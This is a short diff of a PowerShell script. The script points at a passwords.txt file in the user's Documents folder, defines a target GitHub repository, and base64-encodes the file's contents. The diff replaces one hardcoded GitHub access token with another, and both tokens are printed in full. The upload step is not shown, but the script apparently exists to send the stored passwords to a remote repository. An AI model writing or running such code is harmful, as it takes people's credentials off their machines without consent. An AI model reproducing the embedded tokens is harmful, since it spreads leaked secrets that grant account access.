@@ -2,7 +2,7 @@
 $RepoOwner = "tomasgit17"
 $RepoName = "files"
 $FilePath = "$env:USERPROFILE\Documents\passwords.txt"
-$GitHubToken = "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"
+$GitHubToken = "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"
 
 # Convert file to Base64
 $FileContent = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes($FilePath))
